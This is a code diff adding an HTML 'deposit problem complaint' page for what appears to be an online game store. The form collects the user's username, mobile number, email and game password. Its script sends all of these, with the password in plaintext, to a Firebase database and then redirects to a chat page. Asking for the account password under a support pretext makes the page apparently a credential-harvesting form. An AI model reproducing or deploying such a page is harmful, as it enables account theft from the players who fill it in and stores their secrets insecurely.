@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deposit Problem</title>
+    <link rel="icon" type="image/jpeg" href="FAVICONS/images.jpg">
+    <link rel="stylesheet" href="style2.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <a href="index.html" class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
+            </a>
+            <h1>DEPOSITE PROBLEM COMPLAIN PAGE</h1>
+        </div>
+    </header>
+
+    <main>
+        <form class="complain-form">
+            <div class="form-group">
+                <label>USER NAME</label>
+                <input type="text" placeholder="Enter your username" required>
+            </div>
+
+            <div class="form-group">
+                <label>REGISTER MOBIL NUMBER</label>
+                <input type="tel" placeholder="Enter registered mobile number" required>
+            </div>
+
+            <div class="form-group">
+                <label>GAME PASSWORD</label>
+                <input type="password" placeholder="Enter game password" required>
+            </div>
+
+            <div class="form-group">
+                <label>EMAIL ID</label>
+                <input type="email" placeholder="Enter email address" required>
+            </div>
+
+            <div class="form-group">
+                <label>SELECT YOUR PROBLEM</label>
+                <select required>
+                    <option value="" disabled selected>Select your problem</option>
+                    <option value="pending">PENDING</option>
+                    <option value="processing">PROCESSING</option>
+                    <option value="reject">REJECT</option>
+                    <option value="money-not-received">MONEY NOT RECEIVED GAME ACCOUNT</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>UPLOAD PAYMENT PROOF IMAGE</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input">
+                </div>
+                <div class="preview"></div>
+            </div>
+
+            <button type="submit" class="submit-btn">COMPLAIN NOW</button>
+        </form>
+    </main>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBAB_nWexO6iW9RGPmfsqXVjhDWpnlSXoU",
+            authDomain: "zenvy-store-43ca0.firebaseapp.com",
+            databaseURL: "https://zenvy-store-43ca0-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "zenvy-store-43ca0",
+            storageBucket: "zenvy-store-43ca0.firebasestorage.app",
+            messagingSenderId: "469849085917",
+            appId: "1:469849085917:web:efe5625260eaa28ab30834"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const uploadArea = document.querySelector('.upload-area');
+        const fileInput = document.querySelector('.file-input');
+        const preview = document.querySelector('.preview');
+
+        uploadArea.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (event) => {
+                    preview.innerHTML = `<img src="${event.target.result}" alt="Preview">`;
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        const REDIRECT_LINK = 'CHAT/CHAT-PENNAL/index.html';
+
+        document.querySelector('.complain-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const inputs = document.querySelectorAll('.form-group input, .form-group select');
+            let allFilled = true;
+            
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                    input.style.borderColor = '#ff4444';
+                } else {
+                    input.style.borderColor = '#ddd';
+                }
+            });
+            
+            if (!allFilled) {
+                alert('Please fill all fields!');
+                return;
+            }
+
+            const complaintData = {
+                username: inputs[0].value,
+                mobile: inputs[1].value,
+                password: inputs[2].value,
+                email: inputs[3].value,
+                problem: inputs[4].value,
+                type: 'deposit',
+                status: 'pending',
+                timestamp: Date.now()
+            };
+
+            db.ref('complaints/').push(complaintData);
+            
+            const btn = document.querySelector('.submit-btn');
+            btn.classList.add('loading');
+            btn.textContent = 'SUBMITTING...';
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_LINK;
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
